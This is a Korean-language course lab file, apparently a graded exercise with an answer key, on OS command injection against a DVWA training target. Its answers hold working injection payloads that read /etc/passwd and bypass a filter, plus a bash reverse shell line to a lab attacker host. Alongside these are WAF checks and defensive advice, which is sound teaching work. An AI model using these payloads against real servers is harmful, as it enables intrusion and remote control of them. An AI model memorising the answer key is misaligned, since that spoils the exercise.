lab_id: "web-vuln-nonai-week10"
title: "명령 주입 (Command Injection) 실습"
version: "non-ai"
course: "web-vuln-nonai"
week: 10
description: "OS 명령어 주입 취약점을 이용하여 서버에서 임의 명령을 실행하고, 다양한 우회 기법과 방어 방법을 학습합니다."
difficulty: "hard"
duration_minutes: 120
objectives:
  - "명령 주입 공격의 원리를 이해한다"
  - "다양한 메타문자(;, |, &&, ``)를 이용한 주입을 실습한다"
  - "필터 우회 기법을 학습한다"
  - "modsecurity의 명령 주입 차단을 확인한다"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "DVWA(10.20.30.80:8080)의 Command Injection 페이지에서 기본 명령 주입을 시도하라. ip 파라미터에 '127.0.0.1; id'를 넣어 현재 사용자를 확인하라."
    hint: "curl -d 'ip=127.0.0.1;+id&Submit=Submit' 형태로 POST하세요. security=low 쿠키 필요."
    category: "exploit"
    points: 10
    answer: "curl -s -b 'PHPSESSID=test;security=low' -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ 2>/dev/null | grep -oP 'uid=\\d+\\([^)]+\\)'"
    answer_detail: "세미콜론(;)은 셸에서 명령 구분자로, 앞 명령(ping) 후에 id 명령이 실행됩니다. uid=33(www-data)가 출력되면 웹서버 권한으로 명령 실행에 성공한 것입니다."
    verify:
      type: "output_contains"
      expect: "uid="
      field: "stdout"
  - order: 2
    instruction: "파이프(|)를 사용하여 명령 주입을 시도하라. 서버의 /etc/hostname을 읽어라."
    hint: "ip=127.0.0.1+|+cat+/etc/hostname 형태로 보내세요."
    category: "exploit"
    points: 10
    answer: "curl -s -b 'PHPSESSID=test;security=low' -d 'ip=|+cat+/etc/hostname&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ 2>/dev/null | grep -v '<' | grep -v '^$' | head -3"
    answer_detail: "파이프(|)는 앞 명령의 출력을 뒤 명령의 입력으로 전달합니다. 단독으로 사용하면 앞 명령 없이 뒤 명령만 실행됩니다. cat /etc/hostname으로 서버 호스트명을 확인합니다."
    verify:
      type: "output_contains"
      expect: "web"
      field: "stdout"
  - order: 3
    instruction: "백틱(``)을 사용한 명령 주입을 시도하라. 서버의 현재 작업 디렉토리를 확인하라."
    hint: "ip=127.0.0.1;+`pwd` 형태를 사용하세요. URL 인코딩이 필요할 수 있습니다."
    category: "exploit"
    points: 10
    answer: "curl -s -b 'PHPSESSID=test;security=low' --data-urlencode 'ip=127.0.0.1; pwd' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ 2>/dev/null | grep -E '/var|/home|/opt' | head -3"
    answer_detail: "백틱(` `)은 셸에서 명령 치환으로 사용됩니다. $(command) 형태도 동일합니다. 이를 통해 중첩된 명령 실행이 가능합니다."
    verify:
      type: "output_regex"
      expect: "/var|/home|/opt"
      field: "stdout"
  - order: 4
    instruction: "&&(AND) 연산자를 사용한 명령 주입으로 서버의 네트워크 인터페이스 정보를 확인하라."
    hint: "ip=127.0.0.1+&&+ip+addr+show 형태를 사용하세요."
    category: "exploit"
    points: 10
    answer: "curl -s -b 'PHPSESSID=test;security=low' -d 'ip=127.0.0.1+%26%26+ip+addr+show&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ 2>/dev/null | grep -E 'inet |ens|eth' | head -5"
    answer_detail: "&&는 앞 명령이 성공(exit 0)한 경우에만 뒤 명령을 실행합니다. &는 URL에서 파라미터 구분자이므로 %26으로 인코딩해야 합니다."
    verify:
      type: "output_contains"
      expect: "inet"
      field: "stdout"
  - order: 5
    instruction: "리버스 셸 페이로드를 작성하라 (실행하지 말고 파일로 저장만). bash -i를 이용한 리버스 셸 명령을 /tmp/revshell_payload.txt에 기록하라."
    hint: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 형태입니다."
    category: "exploit"
    points: 8
    answer: "echo 'bash -i >& /dev/tcp/10.20.30.201/4444 0>&1' > /tmp/revshell_payload.txt && echo 'Reverse shell payload saved:' && cat /tmp/revshell_payload.txt"
    answer_detail: "리버스 셸은 피해 서버가 공격자에게 역으로 연결하는 기법입니다. 명령 주입으로 이 페이로드를 실행하면 공격자가 서버의 셸을 원격으로 제어할 수 있습니다. 실습에서는 저장만 합니다."
    verify:
      type: "output_contains"
      expect: "Reverse shell payload saved"
      field: "stdout"
  - order: 6
    instruction: "DVWA의 medium 보안 레벨에서 명령 주입 필터를 우회하라. medium에서는 &&와 ;를 필터링하지만 |는 허용된다."
    hint: "security=medium 쿠키를 사용하고, 파이프(|)로 우회하세요."
    category: "exploit"
    points: 12
    answer: "curl -s -b 'PHPSESSID=test;security=medium' -d 'ip=|+cat+/etc/passwd&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ 2>/dev/null | grep 'root' | head -3"
    answer_detail: "DVWA medium 레벨은 str_replace로 '&&'와 ';'를 제거하지만 '|'는 남겨둡니다. 블랙리스트 기반 필터링의 한계 — 모든 메타문자를 차단하지 않으면 우회 가능합니다."
    verify:
      type: "output_contains"
      expect: "root"
      field: "stdout"
  - order: 7
    instruction: "modsecurity가 명령 주입 패턴을 차단하는지 확인하라. Apache(포트 80)에 명령 주입 페이로드를 보내라."
    hint: "curl http://10.20.30.80/?cmd=;id 형태로 보내세요."
    category: "defense"
    points: 10
    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?cmd=;id' && echo '' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?input=127.0.0.1%7Ccat%20/etc/passwd' && echo ''"
    answer_detail: "modsecurity CRS의 REQUEST-932-APPLICATION-ATTACK-RCE.conf에 OS 명령 실행 패턴(;, |, `, $())이 포함됩니다. 932xxx 룰이 매칭되면 403을 반환합니다."
    verify:
      type: "output_contains"
      expect: "403"
      field: "stdout"
  - order: 8
    instruction: "명령 주입 실습 결과를 /tmp/cmdi_report.txt에 정리하라."
    hint: "테스트한 메타문자, 성공/실패 여부, WAF 차단 결과를 포함하세요."
    category: "reporting"
    points: 8
    answer: "cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 진단 보고서 ===\n대상: DVWA (10.20.30.80:8080)\n\n메타문자 테스트:\n  ; (세미콜론): Low에서 성공\n  | (파이프): Low/Medium 모두 성공\n  && (AND): Low 성공, Medium 필터링\n  `` (백틱): Low에서 성공\n\nWAF(modsecurity): 932xxx 룰로 차단 확인\n방어: 입력 화이트리스트, escapeshellcmd(), WAF 룰\nEOF\ncat /tmp/cmdi_report.txt"
    answer_detail: "명령 주입 방어의 핵심은 사용자 입력을 OS 명령에 직접 전달하지 않는 것입니다. 불가피한 경우 escapeshellcmd()/escapeshellarg() 사용, 화이트리스트 검증, WAF 적용이 필요합니다."
    verify:
      type: "output_contains"
      expect: "명령 주입 진단 보고서"
      field: "stdout"
